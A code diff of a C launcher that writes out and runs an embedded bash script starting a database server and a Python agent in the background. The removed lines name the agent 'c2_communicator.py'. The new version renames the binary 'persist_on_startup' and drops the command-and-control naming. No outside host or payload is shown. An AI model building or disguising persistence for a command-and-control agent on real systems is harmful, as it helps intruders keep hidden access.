@@ -8,66 +8,65 @@
 #include <libgen.h>
 
 /*
- * Project layout assumed:
- *
+ * Project layout:
  *   <project_root>/
- *     agent/plugin/C/startup_launcher   <- this binary  (+ source)
- *     agent/plugin/python/c2_communicator.py
- *     db/db_server
- *     startup.sh                        <- extracted here by the binary
- *     logs/                             <- created at runtime
+ *     agent/plugin/C/persist_on_startup   <- this binary
+ *     agent/orchestartion/main.py
+ *     db/db_server_2
+ *     logs/
  */
 
-/* Embedded startup script – paths are relative to project root */
 static const char *STARTUP_SCRIPT_CONTENT =
 "#!/bin/bash\n"
-"# startup.sh - Launches db_server and c2_communicator.py in the background\n"
-"# Place this file at the project root (same level as db/ and agent/).\n"
+"# startup.sh - Launches db_server_2 and main.py with correct CWDs\n"
 "\n"
-"# Resolve the directory where THIS script lives (= project root)\n"
 "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\n"
 "\n"
-"DB_SERVER=\"$SCRIPT_DIR/db/db_server\"\n"
-"PY_COMMUNICATOR=\"$SCRIPT_DIR/agent/plugin/python/c2_communicator.py\"\n"
+"DB_BIN=\"$SCRIPT_DIR/db/db_server_2\"\n"
+"PY_SCRIPT=\"$SCRIPT_DIR/agent/orchestartion/main.py\"\n"
 "LOG_DIR=\"$SCRIPT_DIR/logs\"\n"
 "\n"
 "mkdir -p \"$LOG_DIR\"\n"
 "\n"
-"# -- db_server ----------------------------------------------------------------\n"
-"if [ ! -f \"$DB_SERVER\" ]; then\n"
-"    echo \"[ERROR] db_server not found at: $DB_SERVER\" >&2\n"
+"# ====================== db_server_2 ======================\n"
+"if [ ! -f \"$DB_BIN\" ]; then\n"
+"    echo \"[ERROR] db_server_2 not found at: $DB_BIN\" >&2\n"
 "    exit 1\n"
 "fi\n"
 "\n"
-"if [ ! -x \"$DB_SERVER\" ]; then\n"
-"    chmod +x \"$DB_SERVER\"\n"
+"if [ ! -x \"$DB_BIN\" ]; then\n"
+"    chmod +x \"$DB_BIN\"\n"
 "fi\n"
 "\n"
-"nohup \"$DB_SERVER\" >> \"$LOG_DIR/db_server.log\" 2>&1 &\n"
+"# Run db_server_2 with ./db/ as CWD (as requested)\n"
+"DB_DIR=\"$SCRIPT_DIR/db\"\n"
+"cd \"$DB_DIR\" || exit 1\n"
+"nohup \"$DB_BIN\" >> \"$LOG_DIR/db_server_2.log\" 2>&1 &\n"
 "DB_PID=$!\n"
-"echo \"[OK] db_server started  (PID $DB_PID)\"\n"
-"echo $DB_PID > \"$LOG_DIR/db_server.pid\"\n"
+"echo \"[OK] db_server_2 started (PID $DB_PID) - CWD: $DB_DIR\"\n"
+"echo $DB_PID > \"$LOG_DIR/db_server_2.pid\"\n"
 "\n"
-"# -- c2_communicator.py ----------------------------------------------------------\n"
-"if [ ! -f \"$PY_COMMUNICATOR\" ]; then\n"
-"    echo \"[ERROR] c2_communicator.py not found at: $PY_COMMUNICATOR\" >&2\n"
+"# ====================== main.py ======================\n"
+"if [ ! -f \"$PY_SCRIPT\" ]; then\n"
+"    echo \"[ERROR] main.py not found at: $PY_SCRIPT\" >&2\n"
 "    exit 1\n"
 "fi\n"
 "\n"
 "PYTHON_BIN=$(command -v python3 || command -v python)\n"
 "if [ -z \"$PYTHON_BIN\" ]; then\n"
-"    echo \"[ERROR] No Python interpreter found in PATH\" >&2\n"
+"    echo \"[ERROR] No Python interpreter found\" >&2\n"
 "    exit 1\n"
 "fi\n"
 "\n"
-"nohup \"$PYTHON_BIN\" \"$PY_COMMUNICATOR\" >> \"$LOG_DIR/communicator.log\" 2>&1 &\n"
+"# Run main.py with its own directory as CWD\n"
+"PY_DIR=\"$(dirname \"$PY_SCRIPT\")\"\n"
+"cd \"$PY_DIR\" || exit 1\n"
+"nohup \"$PYTHON_BIN\" \"$PY_SCRIPT\" >> \"$LOG_DIR/communicator.log\" 2>&1 &\n"
 "PY_PID=$!\n"
-"echo \"[OK] c2_communicator.py started (PID $PY_PID)\"\n"
+"echo \"[OK] main.py started (PID $PY_PID) - CWD: $PY_DIR\"\n"
 "echo $PY_PID > \"$LOG_DIR/communicator.pid\"\n"
 "\n"
 "echo \"Startup complete. Logs in $LOG_DIR\"\n";
-
-/* --------------------------------------------------------------------------- */
 
 static void die(const char *msg) {
     perror(msg);
@@ -77,7 +76,7 @@ static void die(const char *msg) {
 static int write_script(const char *script_path) {
     struct stat st;
     if (stat(script_path, &st) == 0) {
-        printf("[INFO] Script already exists at %s - skipping write.\n", script_path);
+        printf("[INFO] Script already exists at %s\n", script_path);
         return 0;
     }
 
@@ -90,29 +89,20 @@ static int write_script(const char *script_path) {
     fputs(STARTUP_SCRIPT_CONTENT, f);
     fclose(f);
 
-    if (chmod(script_path, 0755) != 0)
-        fprintf(stderr, "[WARN] chmod failed on %s: %s\n", script_path, strerror(errno));
-
+    chmod(script_path, 0755);
     printf("[OK] Wrote startup script to %s\n", script_path);
     return 0;
 }
 
-/* --------------------------------------------------------------------------- */
-
 int main(int argc, char *argv[]) {
-    /* Resolve the absolute path of this binary */
     char self_path[4096] = {0};
     ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
     if (len < 0) die("readlink /proc/self/exe");
     self_path[len] = '\0';
 
-    /* bin_dir = .../agent/plugin/C */
     char *bin_dir = dirname(self_path);
 
-    /*
-     * Walk three levels up:
-     *   agent/plugin/C  ->  agent/plugin  ->  agent  ->  <project_root>
-     */
+    /* Go up to project root: agent/plugin/C → project_root */
     char project_root_rel[8192];
     snprintf(project_root_rel, sizeof(project_root_rel), "%s/../../..", bin_dir);
 
@@ -120,11 +110,9 @@ int main(int argc, char *argv[]) {
     if (realpath(project_root_rel, resolved_root) == NULL)
         die("realpath: could not resolve project root");
 
-    /* startup.sh lives at the project root */
     char script_path[8192];
     snprintf(script_path, sizeof(script_path), "%s/startup.sh", resolved_root);
 
-    /* Optional override: ./startup_launcher /custom/path/startup.sh */
     const char *target = (argc > 1) ? argv[1] : script_path;
 
     printf("=== Startup Launcher ===\n");
@@ -132,15 +120,13 @@ int main(int argc, char *argv[]) {
     printf("Project root : %s\n", resolved_root);
     printf("Script path  : %s\n\n", target);
 
-    /* 1. Extract the embedded script if not already present */
     if (write_script(target) != 0) {
         fprintf(stderr, "Failed to prepare startup script.\n");
         return EXIT_FAILURE;
     }
 
-    /* 2. Hand off execution to the script (replaces this process) */
     printf("Running startup script...\n\n");
     execl("/bin/bash", "bash", target, (char *)NULL);
-    die("execl");   /* only reached on error */
+    die("execl");
     return EXIT_FAILURE;
 }
